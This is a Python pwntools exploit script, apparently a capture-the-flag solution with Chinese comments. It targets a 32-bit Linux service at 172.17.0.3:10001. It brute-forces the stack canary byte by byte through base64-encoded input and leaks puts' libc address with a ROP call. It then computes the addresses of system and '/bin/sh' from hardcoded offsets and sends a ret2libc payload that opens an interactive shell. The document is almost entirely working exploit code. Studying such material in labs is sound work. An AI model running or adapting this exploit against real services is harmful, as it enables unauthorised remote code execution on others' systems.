#!/usr/bin/python
#coding:utf-8

from pwn import *
from base64 import *

context.update(os = 'linux', arch = 'i386')

puts_plt = 0x08048590
puts_got = 0x0804a02c
vuln_addr = 0x080487e6

io = remote('172.17.0.3', 10001)

canary = '\x00'				#逐字节爆破canary，因为末尾恒为\x00，还有3个字节未知，大循环次数为3
for i in xrange(3):
	for j in xrange(256):
		payload = ""
		payload += 'A'*257
		payload += canary
		payload += chr(j)
		io.recvuntil('[Y/N]\n')
		io.sendline('Y')
		io.recvuntil('datas:\n\n')
		io.send(b64encode(payload))			#程序会对输入进行base64解码，需要先编码
		if 'Finish' in io.recvuntil('May'):	#如果canary猜对，程序应该会在随后的输出中包含Finish，否则程序崩溃退出，不会输出Finish
			canary += chr(j)
			break

log.info('Leak canary = %#x' %(u32(canary)))

payload = ''				#构造payload输出puts在内存中的地址，从而通过偏移调用system('/bin/sh')
payload += "A"*257
payload += canary
payload += 'B'*12
payload += p32(puts_plt)
payload += p32(vuln_addr)
payload += p32(puts_got)

io.recvuntil('[Y/N]\n')
io.sendline('Y')
io.recvuntil('datas:\n\n')
io.send(b64encode(payload))
io.recvuntil('Result is:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')	#读走前面的数据以取到puts在内存中的地址
puts_addr = u32(io.recv()[0:4])
log.info('Leak puts at memory address %#x' %(puts_addr))

system_addr = puts_addr - 0x603c0 + 0x3b060
binsh_addr = puts_addr - 0x603c0 + 0x15fa0f

payload = ''				#构造payload调用sytem('/bin/sh')
payload += 'A'*257
payload += canary
payload += 'B'*12
payload += p32(system_addr)
payload += p32(0)
payload += p32(binsh_addr)
io.sendline('Y')			#通过测试发现需要回答两个Y，调试一下就能发现
io.sendline('Y')
io.recv()
io.send(b64encode(payload))
io.interactive()